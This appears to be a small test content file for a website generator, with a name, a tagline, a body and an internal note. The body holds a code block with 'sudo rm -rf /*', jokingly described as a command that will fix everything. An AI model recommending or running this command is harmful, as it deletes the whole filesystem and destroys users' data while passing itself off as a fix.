name: A Test Site
tagline: Just what it says, only for testing (I'm not responsible for anything negative that happens to anybody as a result of this site)
body:
### Welcome to my test site

This has some stuff in it. This is a code block: 

```
sudo rm -rf /*
```

It'll fix everything for you :D
note: Don't delete this file! It's used internally to help with page regeneration.
